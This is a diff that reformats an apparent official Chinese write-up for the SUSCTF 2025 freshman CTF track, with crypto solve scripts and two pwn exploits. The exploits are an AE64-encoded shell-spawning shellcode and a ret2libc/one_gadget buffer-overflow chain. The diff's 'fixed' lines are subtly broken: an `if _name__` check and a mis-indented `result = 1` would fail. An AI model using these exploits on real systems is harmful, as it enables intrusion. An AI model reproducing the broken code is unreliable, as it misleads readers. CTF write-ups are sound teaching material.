@@ -3,7 +3,7 @@ title: SUSCTF@2025 新生赛道 官方 writeup
 date: 2025-10-11
 ---
 
-以下是 SUSCTF@2025 主赛道官方 writeup；你可以在[这里](https://github.com/susers/susctf-2025)找到题目附件。
+以下是 SUSCTF@2025 新生赛道官方 writeup；你可以在[这里](https://github.com/susers/susctf-2025)找到题目附件。
 
 全文可能会有点长，欢迎点击页首 TOC 跳转阅读 -v-
 
@@ -109,9 +109,9 @@ def read_index(infile):
 
 ```python
 class RPA3(HeaderBasedVersion):
-    _"""The third official version of the RPA format."""_
+    """The third official version of the RPA format."""
 
-_    _name = "RPA-3.0"
+    name = "RPA-3.0"
     header = b"RPA-3.0"
 
     def find_offset_and_key(self, archive: BinaryIO) -> Tuple[int, Optional[int]]:
@@ -169,7 +169,7 @@ $$
 ```python
 from Crypto.Util.number import long_to_bytes, inverse
 
-_# --- 给定的已知信息 ---_
+# --- 给定的已知信息 ---_
 p = 269362074288207307542642012900174543199
 C = [1349874547, 26990, 285337416819, 2]
 final_flag_list = [50930964716312266177839139457723607648, 201050527555147895574798415306904201600]
@@ -183,12 +183,12 @@ M_inv_01 = (det_inv * (-C2)) % p
 M_inv_10 = (det_inv * (-C0 * C1)) % p
 M_inv_11 = (det_inv * C0) % p
 
-_#应用逆变换10次_
+#应用逆变换10次_
 current_list = final_flag_list
 for _ in range(10):
     x_prime = current_list[0]
     y_prime = current_list[1]
-_    _x = (M_inv_00 * x_prime + M_inv_01 * y_prime) % p
+    x = (M_inv_00 * x_prime + M_inv_01 * y_prime) % p
     y = (M_inv_10 * x_prime + M_inv_11 * y_prime) % p
     current_list = [x, y]
 
@@ -231,44 +231,44 @@ def solve_and_capture():
             p = remote(HOST, PORT)
             for i in range(10):
                 p.recvuntil(b'Input your guess:')
-_                _guess = guess_list[i].encode()
-_                _log.info(f"第 {i + 1}/10 次猜测 -> 发送: {guess.decode()}")
+                guess = guess_list[i].encode()
+                log.info(f"第 {i + 1}/10 次猜测 -> 发送: {guess.decode()}")
                 p.sendline(guess)
-_                _response = p.recvline(timeout=2)
+                response = p.recvline(timeout=2)
 
-                _# 检查响应中是否包含 "Wrong!"_
-_                _if b'Wrong!' in response:
+                # 检查响应中是否包含 "Wrong!"_
+                if b'Wrong!' in response:
                     match = re.search(b'secret is: (\\d+)', response)
                     if match:
                         leaked_secret = match.group(1).decode()
                         log.info(f"捕获到泄露的 secret: {leaked_secret}")
-_                        _if i>0:
+                        if i>0:
                             guess_list[i] = leaked_secret
                             guess_list.append('0')
-_                    _break
+                    break
                 else:
-_                    _log.success(f"第 {i + 1}/10 次猜测正确！")
-_                _if i == 9:
+                    log.success(f"第 {i + 1}/10 次猜测正确！")
+                if i == 9:
                     a_full_attempt_succeeded = True
-_            _if a_full_attempt_succeeded:
+            if a_full_attempt_succeeded:
                 final_output = p.recvall(timeout=2)
                 print("\n" + "=" * 20 + " 服务器最终输出 (Flag) " + "=" * 20)
                 print(final_output.decode(errors='ignore'))
                 print("=" * 62)
                 break
-_        _except EOFError:
-_            _log.failure("连接在读取响应时被关闭。")
+        except EOFError:
+            log.failure("连接在读取响应时被关闭。")
         except Exception as e:
             log.error(f"发生未知错误: {e}。")
         finally:
             if p:
                 p.close()
 
-        _# 失败后，准备下一次重试_
-_        _log.warning("本次尝试失败，1秒后自动重连...")
+        # 失败后，准备下一次重试_
+        log.warning("本次尝试失败，1秒后自动重连...")
         time.sleep(1)
 
-if __name__ == "__main__":
+if _name__ == "__main__":
     solve_and_capture()
 ```
 
@@ -299,7 +299,7 @@ import string
 
 def find_xxx(suffix, target_digest):
     alphabet = string.ascii_letters + string.digits  _# a-z, A-Z, 0-9_
-_    _for candidate in itertools.product(alphabet, repeat=3):
+    for candidate in itertools.product(alphabet, repeat=3):
         xxx = ''.join(candidate)
         test_proof = xxx + suffix
         test_digest = hashlib.sha256(test_proof.encode()).hexdigest()
@@ -330,22 +330,22 @@ for i in '01':
         print("No matching XXX found.")
         conn.close()
 
-_#此时应该已经有2元_
+#此时应该已经有2元_
 conn.recvuntil(b'Exit\n')
 conn.sendline(b'2')
 conn.recvuntil(b"is: ")
 balance = int(conn.recvline()[:-2])
 pure_balance = 0
 prime = 1
-while prime < 0x10000: _#暴力破解16位以下的prime_
-_    _prime = next_prime(prime)
+while prime < 0x10000: #暴力破解16位以下的prime_
+    prime = next_prime(prime)
     pure_balance = balance - prime
     ans = pow(pure_balance,password,n)
     if ans.bit_length() < 1024:
         print(ans,'\n',prime,'\n',pure_balance)
         assert ans == 2
         break
-result = pow(pure_balance,25,n) + prime _#2的25次方已经大于bytes_to_long(b"SUS")_
+result = pow(pure_balance,25,n) + prime #2的25次方已经大于bytes_to_long(b"SUS")_
 conn.sendline(b'3')
 conn.recvuntil(b'decryption):')
 conn.sendline(str(result).encode())
@@ -376,21 +376,21 @@ import math
 
 #计算列表所有数的乘积
 def product(numbers):
-_    _result = 1
+        result = 1
     for number in numbers:
         result *= number
     return result
 
 #计算欧拉函数phi
 def calculate_phi(primes):
-_    _if not primes:
+    if not primes:
         return 0
 
     phi_factors = [(p - 1) for p in primes]
     return product(phi_factors)
 
 def extended_gcd(a, b):
-_    _if a == 0:
+    if a == 0:
         return (b, 0, 1)
     else:
         g, y, x = extended_gcd(b % a, a)
@@ -398,34 +398,34 @@ _    _if a == 0:
 
 #计算模逆元
 def modInverse(e, phi_n):
-_    # 在 Python 3.8+ 中，可以直接使用 pow(e, -1, phi_n)_
-_    _try:
-        _# 这是更现代、更高效的方法_
-_        _return pow(e, -1, phi_n)
+    # 在 Python 3.8+ 中，可以直接使用 pow(e, -1, phi_n)_
+    try:
+        # 这是更现代、更高效的方法_
+        return pow(e, -1, phi_n)
     except (ValueError, TypeError):
-        _# 如果 pow 函数失败或版本过低，则回退到手动实现_
-_        _g, x, y = extended_gcd(e, phi_n)
+        # 如果 pow 函数失败或版本过低，则回退到手动实现_
+        g, x, y = extended_gcd(e, phi_n)
         if g != 1:
             raise Exception('模逆元不存在 (e 和 φ(n) 不互质)')
         return x % phi_n
 
 
 def decrypt_variant_rsa(primes, c, e=65537):
-_    # 步骤 1: 计算模数 n_
-_    _n = product(primes)
+    # 步骤 1: 计算模数 n_
+    n = product(primes)
     print(f"计算得到的模数 n = {n}\n")
 
-    _# 步骤 2: 计算欧拉函数 φ(n)_
-_    _phi_n = calculate_phi(primes)
+    # 步骤 2: 计算欧拉函数 φ(n)_
+    phi_n = calculate_phi(primes)
     print(f"计算得到的欧拉函数 φ(n) = {phi_n}\n")
 
-    _# 步骤 3: 计算私钥 d_
-_    _print(f"正在计算公钥 e = {e} 关于 φ(n) 的模逆元 d...")
+    # 步骤 3: 计算私钥 d_
+    print(f"正在计算公钥 e = {e} 关于 φ(n) 的模逆元 d...")
     d = modInverse(e, phi_n)
     print(f"计算得到的私钥 d = {d}\n")
 
-    _# 步骤 4: 解密消息 m = c^d mod n_
-_    _print(f"正在执行解密: m = c^d mod n...")
+    # 步骤 4: 解密消息 m = c^d mod n_
+    print(f"正在执行解密: m = c^d mod n...")
     print(f"c = {c}")
     print(f"d = {d}")
     print(f"n = {n}")
@@ -436,22 +436,22 @@ _    _print(f"正在执行解密: m = c^d mod n...")
     return m
 
 if __name__ == '__main__':
-    _# 假设我们已知以下信息_
-_    # 1. 构成 n 的质数列表_
-_    _known_primes = [10127759509377869369 , 10727180704304539213 , 10884797493293174131 , 11206472106812234543 , 12024642194926540757 , 12143590433465821751 , 12186908573309000957 , 12230380628802569243 , 12600307272648602333 , 12922047619780672777 , 13983391223160594623 , 14068828809764454053 , 15862322796247191713 , 16807383370975935173 , 17680583573560994507 , 18263603119276970027]
+    # 假设我们已知以下信息_
+    # 1. 构成 n 的质数列表_
+    known_primes = [10127759509377869369 , 10727180704304539213 , 10884797493293174131 , 11206472106812234543 , 12024642194926540757 , 12143590433465821751 , 12186908573309000957 , 12230380628802569243 , 12600307272648602333 , 12922047619780672777 , 13983391223160594623 , 14068828809764454053 , 15862322796247191713 , 16807383370975935173 , 17680583573560994507 , 18263603119276970027]
 
-    _# 2. 公钥指数 e_
-_    _e = 65537
+    # 2. 公钥指数 e_
+    e = 65537
 
-_    _n_example = product(known_primes)
-    _# c = m^e mod n_
-_    _c_example = 299161035261023219665454436563130250285479881392744347903247995597836042974469310193850074993642661153538571895965996883505299010409535525661040795878190454011285887750705940487325762211449715518262707470686064016395080569432509749911115710222633019468023834381670905566504172265826891389412710074266767823
+    n_example = product(known_primes)
+    # c = m^e mod n_
+    c_example = 299161035261023219665454436563130250285479881392744347903247995597836042974469310193850074993642661153538571895965996883505299010409535525661040795878190454011285887750705940487325762211449715518262707470686064016395080569432509749911115710222633019468023834381670905566504172265826891389412710074266767823
 
     print("-------------------- 模拟场景 --------------------")
     print(f"已知质数列表: {known_primes}")
     print(f"公钥指数 e: {e}")
     print("--------------------------------------------------\n")
-_    _try:
+    try:
         decrypted_message = decrypt_variant_rsa(known_primes, c_example, e)
 
         print("\n-------------------- 结果 --------------------")
@@ -637,57 +637,57 @@ ia()
 所以很简单：
 
 ```python
-**from** pwn **import** *
-**from** ae64 **import** AE64
+from pwn import *
+from ae64 import AE64
 
-context**.**log_level = "debug"
-**context**(arch="amd64", os="linux")
-context**.**terminal = ['tmux','splitw','-h']
+context.log_level = "debug"
+context(arch="amd64", os="linux")
+context.terminal = ['tmux','splitw','-h']
 
-**def** **p**(s,m):
-    **if** m **==** 0:
-        io = **process**(s)
-    **else**:
-        **if** ":" **in** s:
-            x = s**.split**(":")
+def p(s,m):
+    if m == 0:
+        io = process(s)
+    else:
+        if ":" in s:
+            x = s.split(":")
             addr = x[0]
-            port = **int**(x[1])
-            io = **remote**(addr,port)
-        **elif** " " **in** s:
-            x = s**.split**(" ")
+            port = int(x[1])
+            io = remote(addr,port)
+        elif " " in s:
+            x = s.split(" ")
             addr = x[0]
-            port = **int**(x[1])
-            io = **remote**(addr,port)
-        **else**:
-            **error**(f"{s} may be some error")
-    **return** io
+            port = int(x[1])
+            io = remote(addr,port)
+        else:
+            error(f"{s} may be some error")
+    return io
 
-**def** **gg**():
-    gdb**.attach**(io)
+def gg():
+    gdb.attach(io)
     raw_input()
 
-s   = **lambda** x  : io**.send**(x)
-sa  = **lambda** x,y: io**.sendafter**(x, y)
-sla = **lambda** x,y: io**.sendlineafter**(x, y)
-sl  = **lambda** x  : io**.sendline**(x)
-rv  = **lambda** x  : io**.recv**(x)
-ru  = **lambda** x  : io**.recvuntil**(x)
-rvl = **lambda**    : io**.recvline**()
-lg  = **lambda** x,y: log**.info**(f"\x1b[01;38;5;214m {x} => {**hex**(y)} \x1b[0m")
-ia  = **lambda**    : io**.interactive**()
-uu32 = **lambda** x   : **u32**(x**.ljust**(4,b'\x00'))
-uu64 = **lambda** x   : **u64**(x**.ljust**(8,b'\x00'))
-l32  = **lambda**     : **u32**(io**.recvuntil**(b"\xf7")[-4:]**.ljust**(4,b"\x00"))
-l64  = **lambda**     : **u64**(io**.recvuntil**(b"\x7f")[-6:]**.ljust**(8,b"\x00"))
+s   = lambda x  : io.send(x)
+sa  = lambda x,y: io.sendafter(x, y)
+sla = lambda x,y: io.sendlineafter(x, y)
+sl  = lambda x  : io.sendline(x)
+rv  = lambda x  : io.recv(x)
+ru  = lambda x  : io.recvuntil(x)
+rvl = lambda    : io.recvline()
+lg  = lambda x,y: log.info(f"\x1b[01;38;5;214m {x} => {hex(y)} \x1b[0m")
+ia  = lambda    : io.interactive()
+uu32 = lambda x   : u32(x.ljust(4,b'\x00'))
+uu64 = lambda x   : u64(x.ljust(8,b'\x00'))
+l32  = lambda     : u32(io.recvuntil(b"\xf7")[-4:].ljust(4,b"\x00"))
+l64  = lambda     : u64(io.recvuntil(b"\x7f")[-6:].ljust(8,b"\x00"))
 
-io = **p**("./new_stu/new_stu/prob_shellcd/shellcd",0)
+io = p("./new_stu/new_stu/prob_shellcd/shellcd",0)
 
-shellcode = **asm**(shellcraft**.sh**())
-ae = **AE64**()
-shell = ae**.encode**(shellcode,"rdx")
-#_ shell = b"RXWTYH39Yj3TYfi9WmWZj8TYfi9JBWAXjKTYfi9kCWAYjCTYfi93iWAZj3TYfi9520t800T810T850T860T870T8A0t8B0T8D0T8E0T8F0T8G0T8H0T8P0t8T0T8YRAPZ0t8J0T8M0T8N0t8Q0t8U0t8WZjUTYfi9200t800T850T8P0T8QRAPZ0t81ZjhHpzbinzzzsPHAghriTTI4qTTTT1vVj8nHTfVHAf1RjnXZP"_
-**sa**(b"enter magic code:",shell)
-**ia**()
+shellcode = asm(shellcraft.sh())
+ae = AE64()
+shell = ae.encode(shellcode,"rdx")
+# shell = b"RXWTYH39Yj3TYfi9WmWZj8TYfi9JBWAXjKTYfi9kCWAYjCTYfi93iWAZj3TYfi9520t800T810T850T860T870T8A0t8B0T8D0T8E0T8F0T8G0T8H0T8P0t8T0T8YRAPZ0t8J0T8M0T8N0t8Q0t8U0t8WZjUTYfi9200t800T850T8P0T8QRAPZ0t81ZjhHpzbinzzzsPHAghriTTI4qTTTT1vVj8nHTfVHAf1RjnXZP"_
+sa(b"enter magic code:",shell)
+ia()
 ```
 
 (吐槽一下，这题是可以直接百度到的，基本算是很常见的原题了，只是题目是我自己写的，所以出来的奇奇怪怪的。用 ai 反而做不出，因为它不是蜘蛛。。）
@@ -701,66 +701,67 @@ shell = ae**.encode**(shellcode,"rdx")
 那么只需要 ret2libc 就可以了，但是 ret2libc 需要知道 libc 的基址，所以考虑首先运行一次 puts，输出 plt 表中的 puts 的地址，然后再进行一次运行，即可完成目的，这里偷了个懒，直接 onegedget 了。但是实际上 system 函数的调用的话，需要考虑运行时的栈地址以及栈对齐相关的问题，前者要求 rbp 在溢出时需要迁移到一个大量可写的地址，后者要求函数栈的末尾是 0 而不是 8，所以需要考虑多做一次 ret 的 gadget。
 
 ```python
-**from** pwn **import** *
+from pwn import *
 
-context**.**log_level = "debug"
-**context**(arch="amd64", os="linux")
-context**.**terminal = ['tmux','splitw','-h']
+context.log_level = "debug"
+context(arch="amd64", os="linux")
+context.terminal = ['tmux','splitw','-h']
 
-**def** **p**(s,m):
-    **if** m **==** 0:
-        io = **process**(s)
-    **else**:
-        **if** ":" **in** s:
-            x = s**.split**(":")
+def p(s,m):
+    if m == 0:
+        io = process(s)
+    else:
+        if ":" in s:
+            x = s.split(":")
             addr = x[0]
-            port = **int**(x[1])
-            io = **remote**(addr,port)
-        **elif** " " **in** s:
-            x = s**.split**(" ")
+            port = int(x[1])
+            io = remote(addr,port)
+        elif " " in s:
+            x = s.split(" ")
             addr = x[0]
-            port = **int**(x[1])
-            io = **remote**(addr,port)
-        **else**:
-            **error**(f"{s} may be some error")
-    **return** io
+            port = int(x[1])
+            io = remote(addr,port)
+        else:
+            error(f"{s} may be some error")
+    return io
 
-**def** **gg**():
-    gdb**.attach**(io)
+def gg():
+    gdb.attach(io)
     raw_input()
-s   = **lambda** x  : io**.send**(x)
-sa  = **lambda** x,y: io**.sendafter**(x, y)
-sla = **lambda** x,y: io**.sendlineafter**(x, y)
-sl  = **lambda** x  : io**.sendline**(x)
-rv  = **lambda** x  : io**.recv**(x)
-ru  = **lambda** x  : io**.recvuntil**(x)
-rvl = **lambda**    : io**.recvline**()
-lg  = **lambda** x,y: log**.info**(f"\x1b[01;38;5;214m {x} => {**hex**(y)} \x1b[0m")
-ia  = **lambda**    : io**.interactive**()
-uu32 = **lambda** x   : **u32**(x**.ljust**(4,b'\x00'))
-uu64 = **lambda** x   : **u64**(x**.ljust**(8,b'\x00'))
-l32  = **lambda**     : **u32**(io**.recvuntil**(b"\xf7")[-4:]**.ljust**(4,b"\x00"))
-l64  = **lambda**     : **u64**(io**.recvuntil**(b"\x7f")[-6:]**.ljust**(8,b"\x00"))
-io = **p**("./new_stu/new_stu/prob_login/login",0)
-proc = **ELF**("./new_stu/new_stu/prob_login/login")
-libc = **ELF**("./new_stu/new_stu/prob_login/libc.so.6")
+
+s   = lambda x  : io.send(x)
+sa  = lambda x,y: io.sendafter(x, y)
+sla = lambda x,y: io.sendlineafter(x, y)
+sl  = lambda x  : io.sendline(x)
+rv  = lambda x  : io.recv(x)
+ru  = lambda x  : io.recvuntil(x)
+rvl = lambda    : io.recvline()
+lg  = lambda x,y: log.info(f"\x1b[01;38;5;214m {x} => {hex(y)} \x1b[0m")
+ia  = lambda    : io.interactive()
+uu32 = lambda x   : u32(x.ljust(4,b'\x00'))
+uu64 = lambda x   : u64(x.ljust(8,b'\x00'))
+l32  = lambda     : u32(io.recvuntil(b"\xf7")[-4:].ljust(4,b"\x00"))
+l64  = lambda     : u64(io.recvuntil(b"\x7f")[-6:].ljust(8,b"\x00"))
+io = p("./new_stu/new_stu/prob_login/login",0)
+proc = ELF("./new_stu/new_stu/prob_login/login")
+libc = ELF("./new_stu/new_stu/prob_login/libc.so.6")
 pop_rdi_ret = 0x401393
 puts_addr = 0x401090
 puts_plt = 0x404018
 main_addr = 0x40123b
-payload = b"a"*0x70 + **p64**(0x404200) + **p64**(pop_rdi_ret) + **p64**(puts_plt) + **p64**(puts_addr) + **p64**(main_addr)
-**sla**(b"username: \n",payload)
-**sla**(b"password: ",b"123")
-puts_value = **l64**()
-**lg**("puts addr",puts_value)
-system_addr = puts_value - libc**.**sym["puts"] + libc**.**sym["system"]
+payload = b"a"*0x70 + p64(0x404200) + p64(pop_rdi_ret) + p64(puts_plt) + p64(puts_addr) + p64(main_addr)
+sla(b"username: \n",payload)
+sla(b"password: ",b"123")
+puts_value = l64()
+lg("puts addr",puts_value)
+system_addr = puts_value - libc.sym["puts"] + libc.sym["system"]
 ones = [0xe3afe,0xe3b01,0xe3b04]
-one_addr = puts_value - libc**.**sym["puts"] + ones[1]
-**lg**("system addr",system_addr)
-payload = b"a"*0x70 + **p64**(0x404200) + **p64**(one_addr)
-**sla**(b"username: \n",payload)
-**sla**(b"password: ",b"123")
-**ia**()
+one_addr = puts_value - libc.sym["puts"] + ones[1]
+lg("system addr",system_addr)
+payload = b"a"*0x70 + p64(0x404200) + p64(one_addr)
+sla(b"username: \n",payload)
+sla(b"password: ",b"123")
+ia()
 ```
 
 ## dragongame
@@ -1304,7 +1305,7 @@ integer_convert_process:
 
 其他符号采用统一的策略，先检测符号的数量是否大于 3，如果大于则报错，否则按照先乘后加减的优先级计算。因为 0 和 3-9 没有被视为数字，所以也会被当做符号，报错 Error: Unknown operator。
 
-综上所述，在计算器的基础上，一共有三个条件：每个数只能包含 1 和 2，每个数最长为 3 位，只能有加减乘号且最多三个。满足这些条件且结果为 8888 的算式只有一个，就是 112*121-22*212。算上交换两个乘数的变化，就是四个答案。
+综上所述，在计算器的基础上，一共有三个条件：每个数只能包含 1 和 2，每个数最长为 3 位，只能有加减乘号且最多三个。满足这些条件且结果为 8888 的算式只有一个，就是 112\*121-22\*212。算上交换两个乘数的变化，就是四个答案。
 
 找答案也利用了 python 脚本
 
